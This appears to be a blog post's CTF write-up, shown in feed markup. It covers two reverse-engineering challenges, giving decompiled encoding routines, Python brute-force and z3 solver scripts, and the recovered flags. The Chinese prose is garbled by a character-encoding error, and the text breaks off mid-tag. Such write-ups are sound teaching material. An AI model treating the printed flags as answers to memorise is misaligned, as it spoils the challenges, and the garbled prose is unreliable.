      <link href="/2019/04/10/2019%E6%8E%98%E5%AE%89%E6%9D%AF-write-up/"/>
      <url>/2019/04/10/2019%E6%8E%98%E5%AE%89%E6%9D%AF-write-up/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="baby-reverse">baby_reverse<a class="post-anchor" href="#baby-reverse"></a></h2><p>åŠ å¯†å‡½æ•°å¦‚ä¸‹</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">encode</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1, __int64 a2)</span></span>&#123;  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-50h]</span>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-30h]</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+74h] [rbp-Ch]</span>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+7Ch] [rbp-4h]</span>  v7 = <span class="hljs-number">18</span>;  i = <span class="hljs-number">0</span>;  v6 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(a1) != <span class="hljs-number">18</span> )    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Your Length is Wrong"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"flag&#123;This_1s_f4cker_flag&#125;"</span>);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v7; i += <span class="hljs-number">3</span> )  &#123;    v5[i] = v7 ^ (a1[i] + <span class="hljs-number">6</span>);    v4[i + <span class="hljs-number">1</span>] = (a1[i + <span class="hljs-number">1</span>] - <span class="hljs-number">6</span>) ^ v7;    v3[i + <span class="hljs-number">2</span>] = a1[i + <span class="hljs-number">2</span>] ^ <span class="hljs-number">6</span> ^ v7;    *(_BYTE *)(a2 + i) = v5[i];    *(_BYTE *)(a2 + i + <span class="hljs-number">1L</span>L) = v4[i + <span class="hljs-number">1</span>];    *(_BYTE *)(a2 + i + <span class="hljs-number">2L</span>L) = v3[i + <span class="hljs-number">2</span>];  &#125;  <span class="hljs-keyword">return</span> a2;&#125;</code></pre><p>å¾ˆç®€å•å¾—åŠ å¯†å‡½æ•°<br>ä¸€å…±åˆ†ä¸ºä¸‰ç»„</p><pre><code class="hljs python">key = <span class="hljs-string">'bIwhroo8cwqgwrxusi'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">18</span>,<span class="hljs-number">3</span>):  flag += chr((ord(key[i])^<span class="hljs-number">18</span>) - <span class="hljs-number">6</span>) + chr((ord(key[i+<span class="hljs-number">1</span>])^<span class="hljs-number">18</span>) + <span class="hljs-number">6</span>) + chr(ord(key[i+<span class="hljs-number">2</span>])^<span class="hljs-number">6</span>^<span class="hljs-number">18</span>)<span class="hljs-keyword">print</span> flag<span class="hljs-comment">#jactf&#123;w0w_is_flag&#125;</span></code></pre><h2 id="Replace">Replace<a class="post-anchor" href="#Replace"></a></h2><p>åŠ å¯†å‡½æ•°å¦‚ä¸‹</p><pre><code class="hljs cpp">v2 = a1;  <span class="hljs-keyword">if</span> ( a2 != <span class="hljs-number">35</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  v4 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    v5 = *(_BYTE *)(v4 + v2);    v6 = (v5 &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;    v7 = (<span class="hljs-number">16</span> * v5 &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;    v8 = byte_402150[<span class="hljs-number">2</span> * v4];    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">48</span> || v8 &gt; <span class="hljs-number">57</span> )      v9 = v8 - <span class="hljs-number">87</span>;    <span class="hljs-keyword">else</span>      v9 = v8 - <span class="hljs-number">48</span>;    v10 = byte_402151[<span class="hljs-number">2</span> * v4];    v11 = <span class="hljs-number">16</span> * v9;    <span class="hljs-keyword">if</span> ( v10 &lt; <span class="hljs-number">48</span> || v10 &gt; <span class="hljs-number">57</span> )      v12 = v10 - <span class="hljs-number">87</span>;    <span class="hljs-keyword">else</span>      v12 = v10 - <span class="hljs-number">48</span>;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)byte_4021A0[<span class="hljs-number">16</span> * v6 + v7] != ((v11 + v12) ^ <span class="hljs-number">0x19</span>) )      <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">if</span> ( ++v4 &gt;= <span class="hljs-number">35</span> )      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</code></pre><p>è¿™æ˜¯çˆ†ç ´çš„æ€è·¯</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> stringbyte_402150 = [<span class="hljs-number">0x32</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>,<span class="hljs-number">0x31</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>,<span class="hljs-number">0x61</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>]byte_4021A0 = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>,  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>,  <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>,  <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>,  <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>,  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>,  <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>,  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,  <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>,  <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>,  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>,  <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>,  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>,  <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>,  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>,  <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,  <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>,  <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>,  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>,  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>,  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>,  <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>,  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>,  <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,  <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>,  <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>]flag=<span class="hljs-string">''</span>v4=<span class="hljs-number">0</span>dic=string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="hljs-string">'&#123;&#125;_!%^&amp;'</span><span class="hljs-keyword">while</span>(v4&lt;<span class="hljs-number">35</span>):  v8 = byte_402150[<span class="hljs-number">2</span>*v4]  <span class="hljs-keyword">if</span> (v8 &lt; <span class="hljs-number">48</span> <span class="hljs-keyword">or</span> v8 &gt; <span class="hljs-number">57</span>):    v9 = v8 - <span class="hljs-number">87</span>  <span class="hljs-keyword">else</span>:    v9 = v8 <span class="hljs-number">-48</span>  v10 = byte_402150[<span class="hljs-number">2</span>*v4+<span class="hljs-number">1</span>]  v11 = <span class="hljs-number">16</span> * v9  <span class="hljs-keyword">if</span>(v10 &lt; <span class="hljs-number">48</span> <span class="hljs-keyword">or</span> v10 &gt;<span class="hljs-number">57</span>):    v12 = v10 <span class="hljs-number">-87</span>  <span class="hljs-keyword">else</span>:    v12 = v10 <span class="hljs-number">-48</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:    v6 = (ord(i)&gt;&gt;<span class="hljs-number">4</span>)%<span class="hljs-number">16</span>    v7 = (<span class="hljs-number">16</span>*ord(i)&gt;&gt;<span class="hljs-number">4</span>)%<span class="hljs-number">16</span>    <span class="hljs-keyword">if</span>(byte_4021A0[<span class="hljs-number">16</span>*v6 + v7]==(v11+v12)^<span class="hljs-number">0x19</span>):      flag += i      <span class="hljs-keyword">break</span>  v4 += <span class="hljs-number">1</span><span class="hljs-keyword">print</span> flag<span class="hljs-comment">#flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span></code></pre><p>è´´ä¸€ä¸‹<a href="https://seanachao.github.io/2018/11/29/%E6%B9%96%E6%B9%98%E6%9D%AFre%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">å¤§ä½¬</a>ç”¨z3è§£çš„è„šæœ¬</p><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8 -*-</span><span class="hljs-comment">#flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span>list_flag = [<span class="hljs-number">51</span>, <span class="hljs-number">80</span>, <span class="hljs-number">239</span>, <span class="hljs-number">133</span>, <span class="hljs-number">33</span>, <span class="hljs-number">32</span>, <span class="hljs-number">69</span>, <span class="hljs-number">199</span>, <span class="hljs-number">143</span>, <span class="hljs-number">207</span>, <span class="hljs-number">199</span>, <span class="hljs-number">143</span>, <span class="hljs-number">207</span>, <span class="hljs-number">237</span>, <span class="hljs-number">249</span>, <span class="hljs-number">60</span>, <span class="hljs-number">81</span>, <span class="hljs-number">80</span>, <span class="hljs-number">77</span>, <span class="hljs-number">207</span>, <span class="hljs-number">0</span>, <span class="hljs-number">77</span>, <span class="hljs-number">81</span>, <span class="hljs-number">199</span>, <span class="hljs-number">239</span>, <span class="hljs-number">251</span>, <span class="hljs-number">195</span>, <span class="hljs-number">207</span>, <span class="hljs-number">110</span>, <span class="hljs-number">159</span>, <span class="hljs-number">251</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">195</span>, <span class="hljs-number">255</span>]byte_4021A0 = [<span class="hljs-number">99</span>, <span class="hljs-number">124</span>, <span class="hljs-number">119</span>, <span class="hljs-number">123</span>, <span class="hljs-number">242</span>, <span class="hljs-number">107</span>, <span class="hljs-number">111</span>, <span class="hljs-number">197</span>, <span class="hljs-number">48</span>, <span class="hljs-number">1</span>, <span class="hljs-number">103</span>, <span class="hljs-number">43</span>, <span class="hljs-number">254</span>, <span class="hljs-number">215</span>, <span class="hljs-number">171</span>, <span class="hljs-number">118</span>, <span class="hljs-number">202</span>, <span class="hljs-number">130</span>, <span class="hljs-number">201</span>, <span class="hljs-number">125</span>, <span class="hljs-number">250</span>, <span class="hljs-number">89</span>, <span class="hljs-number">71</span>, <span class="hljs-number">240</span>, <span class="hljs-number">173</span>, <span class="hljs-number">212</span>, <span class="hljs-number">162</span>, <span class="hljs-number">175</span>, <span class="hljs-number">156</span>, <span class="hljs-number">164</span>, <span class="hljs-number">114</span>, <span class="hljs-number">192</span>, <span class="hljs-number">183</span>, <span class="hljs-number">253</span>, <span class="hljs-number">147</span>, <span class="hljs-number">38</span>, <span class="hljs-number">54</span>, <span class="hljs-number">63</span>, <span class="hljs-number">247</span>, <span class="hljs-number">204</span>, <span class="hljs-number">52</span>, <span class="hljs-number">165</span>, <span class="hljs-number">229</span>, <span class="hljs-number">241</span>, <span class="hljs-number">113</span>, <span class="hljs-number">216</span>, <span class="hljs-number">49</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">199</span>, <span class="hljs-number">35</span>, <span class="hljs-number">195</span>, <span class="hljs-number">24</span>, <span class="hljs-number">150</span>, <span class="hljs-number">5</span>, <span class="hljs-number">154</span>, <span class="hljs-number">7</span>, <span class="hljs-number">18</span>, <span class="hljs-number">128</span>, <span class="hljs-number">226</span>, <span class="hljs-number">235</span>, <span class="hljs-number">39</span>, <span class="hljs-number">178</span>, <span class="hljs-number">117</span>, <span class="hljs-number">9</span>, <span class="hljs-number">131</span>, <span class="hljs-number">44</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">110</span>, <span class="hljs-number">90</span>, <span class="hljs-number">160</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">214</span>, <span class="hljs-number">179</span>, <span class="hljs-number">41</span>, <span class="hljs-number">227</span>, <span class="hljs-number">47</span>, <span class="hljs-number">132</span>, <span class="hljs-number">83</span>, <span class="hljs-number">209</span>, <span class="hljs-number">0</span>, <span class="hljs-number">237</span>, <span class="hljs-number">32</span>, <span class="hljs-number">252</span>, <span class="hljs-number">177</span>, <span class="hljs-number">91</span>, <span class="hljs-number">106</span>, <span class="hljs-number">203</span>, <span class="hljs-number">190</span>, <span class="hljs-number">57</span>, <span class="hljs-number">74</span>, <span class="hljs-number">76</span>, <span class="hljs-number">88</span>, <span class="hljs-number">207</span>, <span class="hljs-number">208</span>, <span class="hljs-number">239</span>, <span class="hljs-number">170</span>, <span class="hljs-number">251</span>, <span class="hljs-number">67</span>, <span class="hljs-number">77</span>, <span class="hljs-number">51</span>, <span class="hljs-number">133</span>, <span class="hljs-number">69</span>, <span class="hljs-number">249</span>, <span class="hljs-number">2</span>, <span class="hljs-number">127</span>, <span class="hljs-number">80</span>, <span class="hljs-number">60</span>, <span class="hljs-number">159</span>, <span class="hljs-number">168</span>, <span class="hljs-number">81</span>, <span class="hljs-number">163</span>, <span class="hljs-number">64</span>, <span class="hljs-number">143</span>, <span class="hljs-number">146</span>, <span class="hljs-number">157</span>, <span class="hljs-number">56</span>, <span class="hljs-number">245</span>, <span class="hljs-number">188</span>, <span class="hljs-number">182</span>, <span class="hljs-number">218</span>, <span class="hljs-number">33</span>, <span class="hljs-number">16</span>, <span class="hljs-number">255</span>, <span class="hljs-number">243</span>, <span class="hljs-number">210</span>, <span class="hljs-number">205</span>, <span class="hljs-number">12</span>, <span class="hljs-number">19</span>, <span class="hljs-number">236</span>, <span class="hljs-number">95</span>, <span class="hljs-number">151</span>, <span class="hljs-number">68</span>, <span class="hljs-number">23</span>, <span class="hljs-number">196</span>, <span class="hljs-number">167</span>, <span class="hljs-number">126</span>, <span class="hljs-number">61</span>, <span class="hljs-number">100</span>, <span class="hljs-number">93</span>, <span class="hljs-number">25</span>, <span class="hljs-number">115</span>, <span class="hljs-number">96</span>, <span class="hljs-number">129</span>, <span class="hljs-number">79</span>, <span class="hljs-number">220</span>, <span class="hljs-number">34</span>, <span class="hljs-number">42</span>, <span class="hljs-number">144</span>, <span class="hljs-number">136</span>, <span class="hljs-number">70</span>, <span class="hljs-number">238</span>, <span class="hljs-number">184</span>, <span class="hljs-number">20</span>, <span class="hljs-number">222</span>, <span class="hljs-number">94</span>, <span class="hljs-number">11</span>, <span class="hljs-number">219</span>, <span class="hljs-number">224</span>, <span class="hljs-number">50</span>, <span class="hljs-number">58</span>, <span class="hljs-number">10</span>, <span class="hljs-number">73</span>, <span class="hljs-number">6</span>, <span class="hljs-number">36</span>, <span class="hljs-number">92</span>, <span class="hljs-number">194</span>, <span class="hljs-number">211</span>, <span class="hljs-number">172</span>, <span class="hljs-number">98</span>, <span class="hljs-number">145</span>, <span class="hljs-number">149</span>, <span class="hljs-number">228</span>, <span class="hljs-number">121</span>, <span class="hljs-number">231</span>, <span class="hljs-number">200</span>, <span class="hljs-number">55</span>, <span class="hljs-number">109</span>, <span class="hljs-number">141</span>, <span class="hljs-number">213</span>, <span class="hljs-number">78</span>, <span class="hljs-number">169</span>, <span class="hljs-number">108</span>, <span class="hljs-number">86</span>, <span class="hljs-number">244</span>, <span class="hljs-number">234</span>, <span class="hljs-number">101</span>, <span class="hljs-number">122</span>, <span class="hljs-number">174</span>, <span class="hljs-number">8</span>, <span class="hljs-number">186</span>, <span class="hljs-number">120</span>, <span class="hljs-number">37</span>, <span class="hljs-number">46</span>, <span class="hljs-number">28</span>, <span class="hljs-number">166</span>, <span class="hljs-number">180</span>, <span class="hljs-number">198</span>, <span class="hljs-number">232</span>, <span class="hljs-number">221</span>, <span class="hljs-number">116</span>, <span class="hljs-number">31</span>, <span class="hljs-number">75</span>, <span class="hljs-number">189</span>, <span class="hljs-number">139</span>, <span class="hljs-number">138</span>, <span class="hljs-number">112</span>, <span class="hljs-number">62</span>, <span class="hljs-number">181</span>, <span class="hljs-number">102</span>, <span class="hljs-number">72</span>, <span class="hljs-number">3</span>, <span class="hljs-number">246</span>, <span class="hljs-number">14</span>, <span class="hljs-number">97</span>, <span class="hljs-number">53</span>, <span class="hljs-number">87</span>, <span class="hljs-number">185</span>, <span class="hljs-number">134</span>, <span class="hljs-number">193</span>, <span class="hljs-number">29</span>, <span class="hljs-number">158</span>, <span class="hljs-number">225</span>, <span class="hljs-number">248</span>, <span class="hljs-number">152</span>, <span class="hljs-number">17</span>, <span class="hljs-number">105</span>, <span class="hljs-number">217</span>, <span class="hljs-number">142</span>, <span class="hljs-number">148</span>, <span class="hljs-number">155</span>, <span class="hljs-number">30</span>, <span class="hljs-number">135</span>, <span class="hljs-number">233</span>, <span class="hljs-number">206</span>, <span class="hljs-number">85</span>, <span class="hljs-number">40</span>, <span class="hljs-number">223</span>, <span class="hljs-number">140</span>, <span class="hljs-number">161</span>, <span class="hljs-number">137</span>, <span class="hljs-number">13</span>, <span class="hljs-number">191</span>, <span class="hljs-number">230</span>, <span class="hljs-number">66</span>, <span class="hljs-number">104</span>, <span class="hljs-number">65</span>, <span class="hljs-number">153</span>, <span class="hljs-number">45</span>, <span class="hljs-number">15</span>, <span class="hljs-number">176</span>, <span class="hljs-number">84</span>, <span class="hljs-number">187</span>]<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">z3_solve</span><span class="hljs-params">(res_flag,byte_4021A0,flag1)</span>:</span>solve_flag = Solver()flag2 = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):flag2.append(BitVec(<span class="hljs-string">'v'</span>+str(i),<span class="hljs-number">8</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):solve_flag.add(( (<span class="hljs-number">16</span> * ((flag2[i] &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>))+(<span class="hljs-number">16</span> * flag2[i] &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>)== flag1[i])check_flag = solve_flag.check()<span class="hljs-keyword">print</span> check_flag,type(check_flag)res_model = solve_flag.model()flag_final = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">35</span>):flag_chr =(<span class="hljs-string">"%s"</span>%(res_model[flag2[i]]))flag_final  = flag_final + chr(int(flag_chr))<span class="hljs-keyword">print</span> flag_final<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">res_find</span><span class="hljs-params">(list_flag,byte_4021A0)</span>:</span>list_find = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list_flag:res = byte_4021A0.index(i)list_find.append(res)<span class="hljs-keyword">return</span> list_find<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:res = res_find(list_flag,byte_4021A0)<span class="hljs-comment"># for i in res:</span><span class="hljs-comment"># print i</span>z3_solve(list_flag,byte_4021A0,res)<span class="hljs-keyword">print</span> <span class="hljs-string">"Finish\n"</span></code></pre><h1 id="Misc">Misc<a class="post-anchor" href="#Misc"></a></h1><h2 id="çœŸçš„ä¸æ˜¯å›¾ç‰‡">çœŸçš„ä¸æ˜¯å›¾ç‰‡<a class="post-anchor" 